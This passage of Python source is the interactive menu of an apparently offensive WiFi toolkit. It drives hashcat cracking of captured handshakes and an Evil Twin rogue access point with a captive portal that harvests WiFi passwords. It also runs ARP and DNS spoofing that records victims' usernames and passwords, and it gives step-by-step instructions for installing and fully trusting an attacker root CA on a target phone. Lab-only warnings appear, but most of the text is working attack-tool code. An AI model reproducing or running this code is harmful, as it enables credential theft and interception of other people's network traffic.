                        )
                        for line in iter(proc.stdout.readline, ""):
                            con.print("[dim]{line}[/]".format(line=line.rstrip()))
                        proc.wait(timeout=3600)
                    except Exception as e:
                        con.print("[err]{e}[/]".format(e=e))
        Prompt.ask("\n[dim]Enter[/]")

    def view_hashcat(self):
        """Hashcat Cracker"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Hashcat Cracker[/]", style="cyan"))
            hc = HashcatRunner()
            if not hc.is_installed():
                con.print("\n[err]hashcat not installed![/]")
                con.print("[dim]apt install hashcat[/]")
                Prompt.ask("\n[dim]Enter[/]")
                break
            con.print()
            con.print("  [mn]1[/] - Crack Capture File")
            con.print("  [mn]2[/] - Crack with Smart Wordlist")
            con.print("  [mn]3[/] - Crack with Rules")
            con.print("  [mn]4[/] - List Captures")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0": break
            elif ch == "1":
                caps = hc.list_captures()
                if not caps:
                    con.print("[warn]No captures[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                for i, c in enumerate(caps, 1):
                    con.print(f"  [{i}] {c['name']}")
                sel = IntPrompt.ask("Select #", default=1)
                if sel < 1 or sel > len(caps): continue
                cap = caps[sel-1]["file"]
                wl = Prompt.ask("Wordlist", default=self.cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
                self.cfg.set("wordlist", wl)
                con.print("\n[hdr]Cracking...[/]\n")
                def cb1(line):
                    if ":" in line and len(line) > 10: con.print(f"[ok]{line}[/]")
                    elif "%" in line: con.print(f"[inf]{line}[/]")
                    else: con.print(f"[dim]{line}[/]")
                try: result = hc.crack(cap, wl, callback=cb1)
                except KeyboardInterrupt: hc.stop(); result = {"status": "stopped"}
                con.print(f"\n  Status: {result.get('status')}")
                if result.get("password"):
                    con.print(f"  [ok]PASSWORD: {result['password']}[/]")
                    self.db.add_credential("", "", None, result["password"], "hashcat")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                caps = hc.list_captures()
                if not caps:
                    con.print("[warn]No captures[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                for i, c in enumerate(caps, 1):
                    con.print(f"  [{i}] {c['name']}")
                sel = IntPrompt.ask("Select #", default=1)
                cap = caps[sel-1]["file"]
                essid = Prompt.ask("ESSID")
                brand = Prompt.ask("Brand", default="")
                con.print("[inf]Generating wordlist...[/]")
                from modules.wordlist import WordlistGenerator
                gen = WordlistGenerator()
                max_wl = IntPrompt.ask("Max words", default=100000)
                words = gen.generate_for_network(essid, brand=brand, max_words=max_wl)
                wl_path = "/tmp/wl_smart.txt"
                with open(wl_path, "w") as f:
                    for w in words: f.write(w + "\n")
                con.print(f"[ok]{len(words)} passwords[/]\n")
                def cb2(line):
                    if ":" in line and len(line) > 10: con.print(f"[ok]{line}[/]")
                    else: con.print(f"[dim]{line}[/]")
                try: result = hc.crack(cap, wl_path, callback=cb2)
                except KeyboardInterrupt: hc.stop(); result = {"status": "stopped"}
                con.print(f"\n  Status: {result.get('status')}")
                if result.get("password"): con.print(f"  [ok]PASSWORD: {result['password']}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                caps = hc.list_captures()
                if not caps:
                    con.print("[warn]No captures[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                for i, c in enumerate(caps, 1):
                    con.print(f"  [{i}] {c['name']}")
                sel = IntPrompt.ask("Select #", default=1)
                cap = caps[sel-1]["file"]
                wl = Prompt.ask("Wordlist", default=self.cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
                self.cfg.set("wordlist", wl)
                rules = Prompt.ask("Rules", default="/usr/share/hashcat/rules/best64.rule")
                def cb3(line):
                    if ":" in line and len(line) > 10: con.print(f"[ok]{line}[/]")
                    else: con.print(f"[dim]{line}[/]")
                try: result = hc.crack(cap, wl, rules=rules, callback=cb3)
                except KeyboardInterrupt: hc.stop(); result = {"status": "stopped"}
                con.print(f"\n  Status: {result.get('status')}")
                if result.get("password"): con.print(f"  [ok]PASSWORD: {result['password']}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                caps = hc.list_captures()
                if caps:
                    for i, c in enumerate(caps, 1):
                        con.print(f"  [{i}] {c['name']} ({c['size']} bytes)")
                else:
                    con.print("[warn]No captures[/]")
                Prompt.ask("\n[dim]Enter[/]")

    def view_recon(self):
        """Network Reconnaissance"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Network Recon[/]", style="cyan"))
            recon = NetworkRecon()
            gw = recon.get_gateway()
            local = recon.get_local_ip()
            con.print(f"\n  Local: [inf]{local}[/]  Gateway: [inf]{gw}[/]")
            con.print()
            con.print("  [mn]1[/] - Ping Scan (discover devices)")
            con.print("  [mn]2[/] - Port Scan")
            con.print("  [mn]3[/] - OS Detection")
            con.print("  [mn]4[/] - Traceroute")
            con.print("  [mn]5[/] - WiFi Scan")
            con.print("  [mn]6[/] - Full Recon")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0": break
            elif ch == "1":
                target = Prompt.ask("Subnet", default=recon.get_subnet())
                con.print(f"\n[inf]Scanning {target}...[/]\n")
                hosts = recon.ping_scan(target)
                if isinstance(hosts, dict) and hosts.get("error"):
                    con.print(f"[err]{hosts['error']}[/]")
                elif hosts:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("#", width=3); t.add_column("IP")
                    t.add_column("Hostname"); t.add_column("MAC"); t.add_column("Vendor")
                    for i, h in enumerate(hosts, 1):
                        t.add_row(str(i), h.get("ip",""), h.get("hostname","-"),
                                 h.get("mac","-"), h.get("vendor","-"))
                    con.print(t)
                    con.print(f"\n  Found: {len(hosts)} devices")
                else:
                    con.print("[warn]No devices found[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                target = Prompt.ask("Target IP", default=gw)
                ports = Prompt.ask("Ports", default="21,22,23,80,443,8080,8443")
                con.print(f"\n[inf]Scanning {target}...[/]\n")
                results = recon.port_scan(target, ports)
                if isinstance(results, dict) and results.get("error"):
                    con.print(f"[err]{results['error']}[/]")
                elif results:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("Port", width=6); t.add_column("State")
                    t.add_column("Service"); t.add_column("Version")
                    for r in results:
                        t.add_row(str(r["port"]), "[ok]open[/]", r["service"], r.get("version","-"))
                    con.print(t)
                else:
                    con.print("[warn]No open ports[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                target = Prompt.ask("Target IP", default=gw)
                con.print(f"\n[inf]Detecting OS on {target}...[/]\n")
                result = recon.os_detect(target)
                if result.get("detected"):
                    for info in result["detected"]:
                        con.print(f"  [ok]{info}[/]")
                else:
                    con.print("[warn]Could not detect OS[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                target = Prompt.ask("Target", default=gw)
                con.print(f"\n[inf]Traceroute to {target}...[/]\n")
                hops = recon.traceroute(target)
                for hop in hops:
                    con.print(f"  {hop['hop']:3d}  {hop['info']}")
                if not hops: con.print("[warn]traceroute failed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                con.print("\n[inf]WiFi scan...[/]\n")
                nets = recon.wifi_scan()
                if nets:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("#", width=3); t.add_column("ESSID")
                    t.add_column("BSSID"); t.add_column("CH"); t.add_column("RSSI")
                    for i, n in enumerate(nets, 1):
                        t.add_row(str(i), n["essid"], n["bssid"],
                                 str(n["channel"]), str(n["rssi"]))
                    con.print(t)
                else: con.print("[warn]No networks[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "6":
                target = Prompt.ask("Target IP", default=gw)
                con.print(f"\n[hdr]Full Recon on {target}[/]\n")
                con.print("[dim]1. Port scan...[/]")
                ports = recon.port_scan(target)
                if isinstance(ports, list):
                    for p in ports:
                        con.print(f"  [ok]Port {p['port']}: {p['service']}[/]")
                con.print("\n[dim]2. OS detection...[/]")
                os_info = recon.os_detect(target)
                if os_info.get("detected"):
                    for info in os_info["detected"]:
                        con.print(f"  [inf]{info}[/]")
                Prompt.ask("\n[dim]Enter[/]")

    def view_evil_twin(self):
        """Evil Twin + Captive Portal"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Evil Twin Attack[/]", style="cyan"))
            con.print("[dim]Rogue AP + captive portal to capture WiFi passwords[/]")
            con.print()
            try:
                r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                ifaces = re.findall(r"Interface (\S+)", r.stdout)
            except:
                ifaces = []
            con.print(f"  Interfaces: {', '.join(ifaces) if ifaces else 'None'}")
            con.print()
            con.print("  [mn]1[/] - Select Target from Database")
            con.print("  [mn]2[/] - Enter ESSID Manually")
            con.print("  [mn]3[/] - View Captured Credentials")
            con.print("  [mn]4[/] - Cleanup Portal Files")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                nets = self.db.get_all_networks()
                if not nets:
                    con.print("[warn]No networks. Scan first.[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                net_table(nets, "Select Target")
                sel = Prompt.ask("# or BSSID", default="1")
                try:
                    idx = int(sel)
                    if 1 <= idx <= len(nets):
                        n = nets[idx-1]
                        essid = str(_get_field(n, "essid", "Unknown"))
                        ch_val = int(_get_field(n, "channel", 6))
                    else:
                        continue
                except:
                    continue
                self._run_evil_twin(essid, ch_val, ifaces)
            elif ch == "2":
                essid = Prompt.ask("ESSID")
                if not essid:
                    continue
                ch_val = IntPrompt.ask("Channel", default=6)
                self._run_evil_twin(essid, ch_val, ifaces)
            elif ch == "3":
                cf = Path("/tmp/evil_twin/captured.txt")
                if cf.exists():
                    with open(cf) as f:
                        creds = f.readlines()
                    if creds:
                        con.print("[ok]Captured:[/]")
                        for line in creds:
                            con.print(f"  [ok]{line.strip()}[/]")
                    else:
                        con.print("[dim]None yet[/]")
                else:
                    con.print("[dim]No Evil Twin run yet[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                cleanup_portal()
                con.print("[ok]Cleaned up[/]")
                Prompt.ask("\n[dim]Enter[/]")

    def _run_evil_twin(self, essid, channel, ifaces):
        con.clear()
        con.print(Rule("[hdr]Evil Twin Launch[/]", style="cyan"))
        con.print(f"\n  Target: [warn]{essid}[/] (CH {channel})\n")
        ap_iface = "wlan1"
        for iface in ifaces:
            if iface != self.cfg.get("interface", "wlan0"):
                ap_iface = iface
                break
        ap_iface = Prompt.ask("AP Interface", default=ap_iface)
        con.print(f"\n  AP: [inf]{ap_iface}[/]  Target: [warn]{essid}[/]  CH: [inf]{channel}[/]")
        if not Confirm.ask("\nStart?", default=True):
            return
        et = EvilTwin(ap_iface, essid, channel)
        def cb(line):
            ll = line.lower()
            if "captured" in ll or "credential" in ll:
                con.print(f"[ok]{line}[/]")
            elif "[+]" in line:
                con.print(f"[ok]{line}[/]")
            elif "[!]" in ll or "error" in ll or "failed" in ll:
                con.print(f"[err]{line}[/]")
            elif "active" in ll or "started" in ll:
                con.print(f"[hdr]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")
        et.callback = cb
        try:
            ok = et.start()
            if ok:
                con.print("\n[ok]Evil Twin running![/]")
                con.print("[dim]Ctrl+C to stop[/]\n")
                while et.running:
                    time.sleep(5)
            else:
                con.print("[err]Failed[/]")
        except KeyboardInterrupt:
            con.print("\n[warn]Stopping...[/]")
            et.stop()
        creds = et.get_captured()
        if creds:
            con.print(f"\n[ok]CAPTURED:[/]")
            for c in creds:
                con.print(f"  [ok]{c}[/]")
                m = re.search(r"Password:(.+)", c)
                if m:
                    self.db.add_credential("", essid, None, m.group(1).strip(), "evil_twin")
                    self.db.log("capture", "evil_twin", f"Password: {m.group(1).strip()}", "ok")
        else:
            con.print("\n[dim]No credentials captured[/]")
        Prompt.ask("\n[dim]Enter[/]")


    def view_lan_mitm(self):
        """LAN MITM Lab: ARP spoof + optional DNS spoof (authorized only)."""
        if not hasattr(self, "_lan_mitm") or self._lan_mitm is None:
            self._lan_mitm = LanMitmLab(
                log=lambda m: con.print("[dim]{0}[/]".format(m)),
                db=self.db
            )
        mitm = self._lan_mitm
        dns_map = {}
        dns_catch = ""
        enable_dns = False

        while True:
            con.clear()
            con.print(Rule("[hdr]LAN MITM Lab (ARP / DNS)[/]", style="cyan"))
            con.print(
                "[warn]Authorized lab only. ARP/DNS spoofing on networks you do not "
                "own is illegal.[/]\n"
            )
            tools = detect_tools()
            st = mitm.status()
            con.print(
                "  IP forward: [inf]{f}[/]  Session: {s}  Backend: {b}".format(
                    f=st.get("ip_forward"),
                    s=("[ok]RUNNING[/]" if st.get("running") else "[dim]stopped[/]"),
                    b=st.get("arp_backend") or "-",
                )
            )
            con.print(
                "  Tools: arpspoof={a} bettercap={c} dnsmasq={d} nmap={n} iptables={i}".format(
                    a="yes" if tools.get("arpspoof") else "no",
                    c="yes" if tools.get("bettercap") else "no",
                    d="yes" if tools.get("dnsmasq") else "no",
                    n="yes" if tools.get("nmap") else "no",
                    i="yes" if tools.get("iptables") else "no",
                )
            )
            con.print()
            con.print("  [mn]1[/] Discover hosts (ip neigh / nmap)")
            con.print("  [mn]2[/] Start ARP spoof (choose targets)")
            con.print("  [mn]3[/] Start ARP spoof ALL targets")
            con.print("  [mn]4[/] Configure DNS spoof map")
            con.print("  [mn]5[/] Start ARP + DNS")
            con.print("  [mn]6[/] Session status")
            con.print("  [mn]7[/] STOP + cleanup")
            con.print("  [mn]8[/] Dependency hints")
            con.print("  [mn]9[/] View Captured Credentials / Live Logs")
            con.print("  [mn]10[/] MITM SSL Lab: Download & Install CA Certificate")
            con.print("  [mn]0[/] Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                if st.get("running"):
                    con.print("[warn]Session still running — prefer stop (7) before leave.[/]")
                    if Confirm.ask("Stop session now?", default=True):
                        mitm.stop()
                break
            elif ch == "1":
                self._lan_mitm_discover(mitm)
            elif ch == "2":
                self._lan_mitm_start(mitm, all_targets=False, enable_dns=False, dns_map=dns_map, dns_catch=dns_catch)
            elif ch == "3":
                self._lan_mitm_start(mitm, all_targets=True, enable_dns=False, dns_map=dns_map, dns_catch=dns_catch)
            elif ch == "4":
                dns_map, dns_catch, enable_dns = self._lan_mitm_config_dns(dns_map, dns_catch)
            elif ch == "5":
                if not dns_map and not dns_catch:
                    con.print("[warn]DNS map empty — configure option 4 first (or catch-all).[/]")
                    if not Confirm.ask("Continue ARP-only style with empty DNS?", default=False):
                        continue
                self._lan_mitm_start(
                    mitm,
                    all_targets=Confirm.ask("Spoof ALL discovered targets?", default=False),
                    enable_dns=True,
                    dns_map=dns_map,
                    dns_catch=dns_catch,
                )
            elif ch == "6":
                self._lan_mitm_status(mitm)
            elif ch == "7":
                ok, msg = mitm.stop()
                con.print(("[ok]" if ok else "[err]") + msg + "[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "8":
                con.print("[hdr]Install hints[/]")
                for line in install_hints():
                    con.print("  " + line)
                con.print(
                    "\n[dim]Without arpspoof, Python raw-socket ARP is used (needs root).\n"
                    "DNS spoof uses a tiny Python UDP server on port 53 + optional iptables redirect.[/]"
                )
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "9":
                self._lan_mitm_live_logs(mitm)
            elif ch == "10":
                self._lan_mitm_cert_instructions(mitm)

    def _lan_mitm_discover(self, mitm):
        con.print(Rule("[hdr]Host discovery[/]", style="cyan"))
        with con.status("[ok]Scanning neighbors...[/]", spinner="dots"):
            hosts = mitm.list_neighbors()
        gw = mitm.get_gateway_ip()
        me = mitm.get_local_ip()
        con.print("  Gateway: [inf]{g}[/]  You: [inf]{m}[/]  Subnet: {s}".format(
            g=gw, m=me, s=mitm.get_subnet_cidr()
        ))
        if not hosts:
            con.print("[warn]No hosts found. Ping devices or disable AP client isolation.[/]")
        else:
            t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
            t.add_column("#", width=4)
            t.add_column("IP")
            t.add_column("MAC")
            t.add_column("Name")
            for i, h in enumerate(hosts, 1):
                mark = " [gw]" if h.ip == gw else ""
                t.add_row(str(i), h.ip + mark, h.mac or "-", (h.name or "")[:24])
            con.print(t)
            self._lan_mitm_hosts_cache = hosts
        Prompt.ask("\n[dim]Enter[/]")

    def _lan_mitm_config_dns(self, dns_map, dns_catch):
        con.print(Rule("[hdr]DNS spoof configuration[/]", style="cyan"))
        con.print(
            "[dim]Map domain → IPv4. Example: captive.lab → your phone IP.\n"
            "Catch-all sends ALL looked-up names to one IP (lab phishing demo).[/]\n"
        )
        me = LanMitmLab().get_local_ip()
        while True:
            con.print("Current map:")
            if not dns_map:
                con.print("  [dim](empty)[/]")
            else:
                for d, ip in dns_map.items():
                    con.print("  {d} → {ip}".format(d=d, ip=ip))
            con.print("  Catch-all: {c}".format(c=dns_catch or "(off)"))
            con.print()
            con.print("  [mn]1[/] Add/update domain")
            con.print("  [mn]2[/] Set catch-all IP")
            con.print("  [mn]3[/] Clear map")
            con.print("  [mn]0[/] Done\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            if ch == "1":
                dom = Prompt.ask("Domain", default="captive.lab").strip().lower().rstrip(".")
                ip = Prompt.ask("IPv4", default=me).strip()
                if not dom:
                    con.print("[err]Domain required[/]")
                    continue
                if not is_valid_ipv4(ip):
                    con.print("[err]Bad IP[/]")
                    continue
                dns_map[dom] = ip
            elif ch == "2":
                ip = Prompt.ask("Catch-all IPv4 (blank=off)", default=me).strip()
                if not ip:
                    dns_catch = ""
                elif not is_valid_ipv4(ip):
                    con.print("[err]Bad IP[/]")
                else:
                    dns_catch = ip
            elif ch == "3":
                dns_map = {}
                dns_catch = ""
        enable = bool(dns_map or dns_catch)
        return dns_map, dns_catch, enable

    def _lan_mitm_start(self, mitm, all_targets=False, enable_dns=False, dns_map=None, dns_catch=""):
        con.print(Rule("[hdr]Start MITM[/]", style="cyan"))
        iface = Prompt.ask("Interface", default=mitm.get_default_iface()).strip()
        gateway = Prompt.ask("Gateway IP", default=mitm.get_gateway_ip()).strip()
        if not is_private_ipv4(gateway):
            con.print("[err]Gateway must be private IPv4[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        dns_upstream = "8.8.8.8"
        enable_portal = False
        portal_template = "socialnet"
        if enable_dns:
            dns_upstream = Prompt.ask("Upstream DNS (for non-spoofed queries)", default="8.8.8.8").strip()
            if not is_valid_ipv4(dns_upstream):
                con.print("[err]Invalid IP — using 8.8.8.8 as default[/]")
                dns_upstream = "8.8.8.8"

            enable_portal = Confirm.ask("Enable local HTTP Captive Portal Lab?", default=False)
            if enable_portal:
                portal_template = Prompt.ask(
                    "Select Portal Template (socialnet / router / wifi / ad_portal)",
                    choices=["socialnet", "router", "wifi", "ad_portal"],
                    default="socialnet",
                ).strip().lower()

        hosts = getattr(self, "_lan_mitm_hosts_cache", None) or mitm.list_neighbors()
        # exclude gateway from targets
        candidates = [h for h in hosts if h.ip != gateway]
        if not candidates:
            con.print("[warn]No neighbor hosts cached — enter IPs manually.[/]")

        targets = []
        if all_targets and candidates:
            targets = [h.ip for h in candidates]
            con.print("[inf]ALL targets ({n}): {t}[/]".format(
                n=len(targets), t=", ".join(targets[:12]) + ("..." if len(targets) > 12 else "")
            ))
        else:
            if candidates:
                t = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan")
                t.add_column("#")
                t.add_column("IP")
                t.add_column("MAC")
                for i, h in enumerate(candidates, 1):
                    t.add_row(str(i), h.ip, h.mac or "-")
                con.print(t)
                raw = Prompt.ask(
                    "Targets: numbers like 1,2,3 OR 'all' OR comma IPs",
                    default="1",
                ).strip()
                if raw.lower() == "all":
                    targets = [h.ip for h in candidates]
                else:
                    for part in raw.split(","):
                        part = part.strip()
                        if not part:
                            continue
                        if part.isdigit():
                            idx = int(part)
                            if 1 <= idx <= len(candidates):
                                targets.append(candidates[idx - 1].ip)
                        else:
                            targets.append(part)
            else:
                raw = Prompt.ask("Target IPs comma-separated")
                targets = [p.strip() for p in raw.split(",") if p.strip()]

        targets = list(dict.fromkeys(targets))
        if not targets:
            con.print("[err]No targets[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        con.print(Panel(
            "Iface: {i}\nGateway: {g}\nTargets ({n}): {t}\nDNS spoof: {d}\nUpstream DNS: {up}\nCaptive Portal: {p}\n"
            "[warn]Traffic of targets may flow through this device.[/]".format(
                i=iface,
                g=gateway,
                n=len(targets),
                t=", ".join(targets[:8]) + ("..." if len(targets) > 8 else ""),
                d=("ON" if enable_dns else "off"),
                up=dns_upstream if enable_dns else "-",
                p="{0} ({1})".format("ON" if enable_portal else "off", portal_template) if enable_portal else "off",
            ),
            title="Confirm MITM",
            border_style="yellow",
        ))
        if not Confirm.ask("I own this lab network / have authorization. Start?", default=False):
            return

        ok, msg = mitm.start(
            iface=iface,
            gateway_ip=gateway,
            targets=targets,
            dns_map=dns_map or {},
            dns_catch_all=dns_catch or "",
            enable_dns=enable_dns,
            dns_upstream=dns_upstream,
            enable_portal=enable_portal,
            portal_template=portal_template,
        )
        if ok:
            con.print("[ok]{m}[/]".format(m=msg))
            try:
                self.db.log(
                    "mitm_start",
                    "lan",
                    "ARP targets={n} dns={d}".format(n=len(targets), d=enable_dns),
                    "warn",
                )
            except Exception:
                pass
        else:
            con.print("[err]{m}[/]".format(m=msg))
        Prompt.ask("\n[dim]Enter[/]")

    def _lan_mitm_status(self, mitm):
        st = mitm.status()
        t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
        t.add_column("K", style="dim")
        t.add_column("V", style="cyan")
        for k in (
            "running", "iface", "gateway_ip", "gateway_mac", "attacker_ip",
            "attacker_mac", "arp_backend", "dns_backend", "dns_enabled",
            "dns_upstream", "portal_enabled", "portal_template", "spoof_packets_sent", "uptime_sec", "ip_forward", "alive_procs",
        ):
            t.add_row(k, str(st.get(k)))
        t.add_row("targets", ", ".join(st.get("targets") or []) or "-")
        t.add_row("dns_map", str(st.get("dns_map") or {}))
        t.add_row("dns_catch_all", str(st.get("dns_catch_all") or ""))
        con.print(Panel(t, title="MITM status", border_style="cyan"))
        Prompt.ask("\n[dim]Enter[/]")

    def _lan_mitm_live_logs(self, mitm):
        con.print(Rule("[hdr]Live MITM Logs & Captured Credentials[/]", style="cyan"))
        st = mitm.status()
        if not st.get("running"):
            con.print("[warn]No MITM session is currently running. Start a session first.[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        con.print("[inf]Press Ctrl+C to exit log view[/]\n")

        # Display currently captured credentials
        creds = mitm.get_captured_creds()
        if creds:
            t = Table(box=box.ROUNDED, show_header=True, header_style="bold green")
            t.add_column("Time", style="dim")
            t.add_column("Victim IP", style="bold cyan")
            t.add_column("Target Host", style="yellow")
            t.add_column("Username/Email", style="bold magenta")
            t.add_column("Password", style="bold red")

            for c in creds:
                local_time = time.strftime("%H:%M:%S", time.localtime(c["time"]))
                t.add_row(local_time, c["src"], c["host"], c["user"] or "-", c["pass"] or "-")
            con.print(t)
        else:
            con.print("[dim]No credentials captured yet. Waiting for HTTP POST traffic...[/]")

        con.print("\n[hdr]Live Packet & DNS Logs (Enter/Ctrl+C to go back):[/]")
        try:
            Prompt.ask("\n[dim]Press Enter to return[/]")
        except KeyboardInterrupt:
            pass

    def _lan_mitm_cert_instructions(self, mitm):
        con.print(Rule("[hdr]MITM SSL Lab: Root CA Certificate Instructions[/]", style="cyan"))

        # Ensure the CA is generated
        mitm.generate_ca_certificate()

        attacker_ip = mitm.get_local_ip()
        url = "http://{0}/ca.crt".format(attacker_ip)

        con.print(Panel(
            "[ok]👉 DIRECT DOWNLOAD URL:[/]\n"
            "  [bold yellow]{url}[/]\n\n"
            "[inf]Open this link from the other phone's browser (Safari/Chrome) to download the certificate instantly![/]".format(url=url),
            title="Download Link",
            border_style="green"
        ))

        android_ins = (
            "[bold cyan]Android (إندرويد):[/]\n"
            "  1. افتح المتصفح في الهاتف واكتب الرابط الأصفر أعلاه لتحميل ملف الشهادة.\n"
            "  2. اذهب إلى إعدادات الهاتف (Settings) -> الحماية والأمان (Security) -> التشفير وبيانات الاعتماد (Encryption & Credentials).\n"
            "  3. اختر تثبيت شهادة (Install a certificate) -> شهادة مرجعية عامة (CA Certificate).\n"
            "  4. حدد الملف الذي قمت بتحميله [bold yellow]mitm-lab-ca.crt[/] واضغط تثبيت.\n\n"
            "  [dim]1. Open browser on target phone and type the URL to download.\n"
            "  2. Go to Settings -> Security -> Encryption & credentials.\n"
            "  3. Tap 'Install a certificate' -> 'CA certificate'.\n"
            "  4. Select the downloaded file and install.[/]"
        )

        ios_ins = (
            "[bold magenta]iOS / iPhone (آيفون):[/]\n"
            "  1. افتح متصفح [bold]Safari[/] واطلب الرابط أعلاه لتنزيل ملف التعريف (Profile).\n"
            "  2. اذهب إلى الإعدادات (Settings) -> ستجد خياراً جديداً في الأعلى باسم 'تم تنزيل ملف التعريف' (Profile Downloaded) اضغط عليه واضغط تثبيت (Install).\n"
            "  3. لتفعيل الشهادة بالكامل: اذهب إلى الإعدادات (Settings) -> عام (General) -> حول (About) -> إعدادات ثقة الشهادات (Certificate Trust Settings).\n"
            "  4. فعل خيار الثقة الكاملة (Enable Full Trust) للشهادة الخاصة بمختبرنا.\n\n"
            "  [dim]1. Open Safari on iPhone and download the certificate profile.\n"
            "  2. Go to Settings -> Profile Downloaded -> Tap Install.\n"
            "  3. Go to Settings -> General -> About -> Certificate Trust Settings.\n"
            "  4. Toggle ON full trust for 'WPS_Toolkit_MITM_Lab_Root_CA'.[/]"
        )

        con.print(Panel(android_ins, title="Android Guide", border_style="cyan"))
        con.print(Panel(ios_ins, title="iOS / iPhone Guide", border_style="magenta"))

        Prompt.ask("\n[dim]Press Enter to return[/]")

    def view_wpa(self):
        """wpa_supplicant Manager"""
        wpa = WpaSupplicant(self.cfg.get("interface", "wlan1"))
        while True:
            con.clear()
            con.print(Rule("[hdr]wpa_supplicant Manager[/]", style="cyan"))
            status = wpa.status()
            st_c = "ok" if status["running"] else "dim"
            st_txt = status["state"] if status["running"] else "NOT RUNNING"
            t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
            t.add_column("K", style="dim", min_width=18)
            t.add_column("V", style="cyan")
            t.add_row("Interface", wpa.iface)
            t.add_row("Status", f"[{st_c}]{st_txt}[/]")
            t.add_row("State", status.get("state", "N/A"))
            t.add_row("SSID", status.get("ssid", "-") or "-")
            t.add_row("BSSID", status.get("bssid", "-") or "-")
            t.add_row("IP", status.get("ip", "-") or "-")
            t.add_row("Key Mgmt", status.get("key_mgmt", "-") or "-")
            con.print(Panel(t, title="wpa_supplicant Status", border_style="cyan"))
            con.print()
            con.print("  [mn]1[/] - Start  [mn]2[/] - Stop  [mn]3[/] - Scan")
            con.print("  [mn]4[/] - Connect  [mn]5[/] - Hidden  [mn]6[/] - Enterprise")
            con.print("  [mn]7[/] - Disconnect  [mn]8[/] - List Saved")
            con.print("  [mn]9[/] - Remove  [mn]10[/] - Extract Passwords")
            con.print("  [mn]11[/] - Signal  [mn]12[/] - WPS PIN  [mn]13[/] - WPS PBC")
            con.print("  [mn]14[/] - Raw Status  [mn]15[/] - Reconfigure")
            con.print("  [mn]16[/] - Save Scan to DB  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                conf = Prompt.ask("Config (Enter=auto)", default="")
                if wpa.start(conf if conf else None):
                    con.print("[ok]Started[/]")
                else:
                    con.print("[err]Failed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                wpa.stop(); con.print("[ok]Stopped[/]"); Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                if not wpa.is_running():
                    con.print("[warn]Start first![/]"); Prompt.ask("\n[dim]Enter[/]"); continue
                con.print("  Scanning...")
                nets = wpa.scan_results()
                if nets:
                    net_table(nets, f"wpa_cli Scan ({len(nets)})")
                    nc = 0
                    for n in nets:
                        if not self.db.get_network(n["bssid"]): nc += 1
                        self.db.add_network(n)
                    con.print(f"\n  [ok]{len(nets)} ({nc} new) saved[/]")
                else:
                    con.print("[warn]No results[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                if not wpa.is_running():
                    con.print("[warn]Start first![/]"); Prompt.ask("\n[dim]Enter[/]"); continue
                ssid = Prompt.ask("SSID")
                psk = Prompt.ask("Password (empty=open)", default="")
                ok, msg = wpa.connect(ssid, psk if psk else None)
                con.print(f"[ok]{msg}[/]" if ok else f"[err]{msg}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                if not wpa.is_running():
                    con.print("[warn]Start first![/]"); Prompt.ask("\n[dim]Enter[/]"); continue
                ssid = Prompt.ask("Hidden SSID")
                psk = Prompt.ask("Password", default="")
                ok, msg = wpa.connect_hidden(ssid, psk if psk else None)
                con.print(f"[ok]{msg}[/]" if ok else f"[err]{msg}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "6":
                if not wpa.is_running():
                    con.print("[warn]Start first![/]"); Prompt.ask("\n[dim]Enter[/]"); continue
                ssid = Prompt.ask("SSID")
                identity = Prompt.ask("Username")
                password = Prompt.ask("Password")
                eap = Prompt.ask("EAP", default="PEAP")
                ok, msg = wpa.connect_eap(ssid, identity, password, eap)
                con.print(f"[ok]{msg}[/]" if ok else f"[err]{msg}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "7":
                wpa.disconnect(); con.print("[ok]Disconnected[/]"); Prompt.ask("\n[dim]Enter[/]")
            elif ch == "8":
                nets = wpa.list_networks()
